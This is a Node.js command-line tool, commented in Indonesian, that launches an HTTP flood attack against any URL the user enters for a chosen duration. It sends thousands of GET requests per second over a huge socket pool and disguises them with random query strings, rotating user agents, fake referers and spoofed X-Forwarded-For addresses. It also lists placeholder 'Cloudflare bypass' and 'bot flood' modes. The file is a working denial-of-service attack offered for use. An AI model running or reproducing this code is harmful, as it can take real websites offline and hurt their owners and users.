const readline = require("readline");
const os = require("os");
const https = require("https");
const http = require("http");
const { URL } = require("url");

// Tampilkan IP publik via ipify API
function getPublicIP(callback) {
  https.get("https://api.ipify.org?format=json", (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback("Tidak diketahui");
      }
    });
  }).on("error", () => {
    callback("Gagal mengambil IP");
  });
}

// Fungsi Flood Attack
function startAggressiveFlood(target, duration) {
  const { request, Agent } = target.startsWith("https") ? require("https") : require("http");
  const url = new URL(target);
  const agent = new Agent({ keepAlive: true, maxSockets: 10000 });

  const userAgents = [
    "Mozilla/5.0", "Chrome/90.0", "Safari/537.36", "Edge/18.0", "Opera/9.80"
  ];

  let total = 0;
  let success = 0;
  let failed = 0;

  const randomIP = () =>
    Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join(".");

  const randomQuery = () =>
    `?r=${Math.random().toString(36).substring(2)}&t=${Date.now()}`;

  const spam = () => {
    for (let i = 0; i < 2000; i++) {
      const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === "https:" ? 443 : 80),
        path: url.pathname + randomQuery(),
        method: "GET",
        headers: {
          "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
          "Referer": "https://google.com/" + Math.random(),
          "X-Forwarded-For": randomIP(),
          "Connection": "keep-alive"
        },
        agent
      };

      const req = request(options, res => {
        total++;
        if (res.statusCode >= 200 && res.statusCode < 400) success++;
        else failed++;
        res.resume();
      });

      req.on("error", () => {
        total++;
        failed++;
      });

      req.end();
    }
  };

  const spammer = setInterval(spam, 50);

  const logger = setInterval(() => {
    console.clear();
    console.log(`Target   : ${target}`);
    console.log(`Durasi   : ${duration}s`);
    console.log(`Terkirim : ${total}`);
    console.log(`Sukses   : ${success}`);
    console.log(`Gagal    : ${failed}`);
  }, 1000);

  setTimeout(() => {
    clearInterval(spammer);
    clearInterval(logger);
    console.log("\n[✓] Serangan selesai.");
    console.log(`Total    : ${total}`);
    console.log(`Sukses   : ${success}`);
    console.log(`Gagal    : ${failed}`);
  }, duration * 1000);
}

// Tampilkan menu utama
function showMenu(ip) {
  const platform = os.platform();
  const deviceType = /android/.test(platform) ? "Android/Termux" : platform;

  console.clear();
  console.log("==============================");
  console.log("     TOOLS JS INFORMATION     ");
  console.log("==============================");
  console.log("IP Address  :", ip);
  console.log("Device      :", deviceType);
  console.log("==============================");
  console.log("1. Mode Flood");
  console.log("2. Bypass Cloudflare");
  console.log("3. Bot Flood");
  console.log("0. Exit");
  console.log("==============================");

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question("Pilih mode: ", (input) => {
    switch (input) {
      case '1':
        rl.question("Target URL: ", (url) => {
          rl.question("Durasi (detik): ", (time) => {
            console.log("Menjalankan mode flood...\n");
            startAggressiveFlood(url, parseInt(time));
            rl.close(); // Tutup prompt
          });
        });
        break;

      case '2':
        console.log("Mode CF Bypass belum tersedia.");
        rl.close();
        break;

      case '3':
        console.log("Mode Bot Flood belum tersedia.");
        rl.close();
        break;

      case '0':
        console.log("Keluar...");
        rl.close();
        break;

      default:
        console.log("Pilihan tidak valid.");
        rl.close();
    }
  });
}

// Jalankan program
getPublicIP((ip) => {
  showMenu(ip);
});